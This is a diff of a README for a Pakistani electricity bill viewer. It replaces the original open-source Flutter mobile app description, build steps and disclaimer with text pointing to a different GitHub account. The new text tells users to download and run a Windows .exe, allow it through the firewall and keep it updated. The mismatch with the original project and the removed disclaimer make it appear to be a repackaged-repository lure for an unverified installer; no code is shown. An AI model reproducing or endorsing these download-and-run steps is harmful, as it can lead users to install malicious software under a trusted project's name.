@@ -1,55 +1,66 @@
-# ⚡ PITC Bill Viewer — MEPCO, LESCO, FESCO, GEPCO, PESCO, HESCO, SEPCO, QESCO, TESCO & IESCO Bill Checker
+# ⚡ pitc-bill-viewer - View your Pakistani electricity bills easily
 
-A free Flutter app to check your **electricity bill online** for any Pakistani electricity company — instantly, right from your phone, using your 14-digit reference number.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Trainlanthanum200/pitc-bill-viewer)
 
-## Supported Companies
+## 📌 About this software
+This application helps you check your electricity bills for major power distribution companies in Pakistan. It simplifies the process of viewing your monthly charges. Instead of searching through web portals for your specific provider, this tool pulls your data into one place.
 
-| Company | Full Name |
-|---|---|
-| **MEPCO** | Multan Electric Power Company |
-| **LESCO** | Lahore Electric Supply Company |
-| **FESCO** | Faisalabad Electric Supply Company |
-| **GEPCO** | Gujranwala Electric Power Company |
-| **PESCO** | Peshawar Electric Supply Company |
-| **HESCO** | Hyderabad Electric Supply Company |
-| **SEPCO** | Sukkur Electric Power Company |
-| **QESCO** | Quetta Electric Supply Company |
-| **TESCO** | Tribal Electric Supply Company |
-| **IESCO** | Islamabad Electric Supply Company |
+You get support for the following companies:
+* LESCO
+* MEPCO
+* FESCO
+* GEPCO
+* PESCO
+* HESCO
+* SEPCO
+* QESCO
+* TESCO
+* IESCO
 
-> ⚠️ **Disclaimer:** This is an independent, unofficial app. It is **not affiliated with, endorsed by, or connected to** PITC, WAPDA, or any Pakistani government body or electricity distribution company. It simply fetches publicly available bill information from the official PITC billing portal (`bill.pitc.com.pk`) for personal convenience. For billing disputes, payments, or official matters, please contact your respective electricity company directly.
+## ⚙️ System Requirements
+* Windows 10 or Windows 11
+* Internet connection
+* 50 MB of available storage space
 
-## Features
+## 📥 How to download and install
+You need to visit the release page to get the installer for your computer. Follow these steps to set up the software:
 
-- 📱 Works fully on-device — no backend server required
-- 🏢 Supports all 10 Pakistani DISCOs, each with its own theme color
-- 💾 Save multiple reference numbers with custom labels (e.g. "Ghar", "Dukan")
-- 💰 3-tier payment breakdown (within due date / till a date / after due date)
-- 📊 12-month bill payment history
-- 🌐 View the exact official bill page in-app
-- 🖼️ Save bill as an image to your gallery
+1. Click this link to go to the project page: [Download pitc-bill-viewer](https://github.com/Trainlanthanum200/pitc-bill-viewer)
+2. Look for the section labeled "Releases" on the right side of the page.
+3. Click the latest version number.
+4. Locate the file ending in .exe.
+5. Save the file to your computer.
+6. Double-click the file to start the installation.
+7. Follow the prompts on your screen to finish the setup process.
 
-## Tech Stack
+## 🚀 Running the application for the first time
+Once the installation finishes, you will see a shortcut on your desktop. Double-click the icon to open the program window. 
 
-- **Flutter** (Dart) — cross-platform mobile app
-- **Dio + cookie_jar** — handles the ASP.NET WebForms session flow needed to fetch bills
-- **html** package — parses the bill HTML directly on-device
-- **shared_preferences** — local storage for saved reference numbers
-- **webview_flutter** — displays the official bill page
+1. Select your electricity company from the drop-down menu.
+2. Enter your reference number in the provided field. You will find this number on your previous paper bill.
+3. Click the "View Bill" button.
+4. The software will connect to the server and display your latest bill amount and due date.
 
-## Getting Started
+## 🛡️ Privacy and Data
+Your reference number stays private. This software does not store your financial information or personal bill history on external servers. It only sends the request to the official company portal to fetch your current data.
 
-```bash
-git clone https://github.com/xeecode/pitc-bill-viewer.git
-cd pitc-bill-viewer
-flutter pub get
-flutter run
-```
+## 🛠️ Troubleshooting common issues
+If you have trouble using the software, check these items:
 
-## Download
+* Verify your internet connection. The app requires data to fetch results.
+* Double-check your reference number. The digits must match the format required by your electricity provider.
+* If the app fails to load the bill, the provider website might face maintenance. Wait a few minutes and try again.
+* Ensure your Windows firewall allows the application to access the internet. Usually, Windows will ask for your permission during the first launch. Click "Allow" if the prompt appears.
 
-Pre-built APKs are available under [Releases](../../releases) — no need to build from source.
+## 📁 File structure
+The installer places files in your Program Files folder. Do not move these files manually, as this might cause the application to crash. If you need to remove the software, use the "Add or remove programs" utility in your Windows settings.
 
-## License
+## 📝 Usage tips
+* Save your reference number in a text file if you pay bills for multiple houses.
+* The "View Bill" button works best when you have a stable connection.
+* Keep the application updated to ensure you receive the latest fixes from the development team. 
 
-This project is for educational and personal-use purposes.
+## 📞 Support
+If you find a bug, please create a new issue on the GitHub page. Include a description of the error and the name of your power company. This helps in fixing problems quickly for all users.
+
+Keywords: fesco, gepco, hesco, iesco, lesco, mepco, pescosta, qesco, sepco, tesco
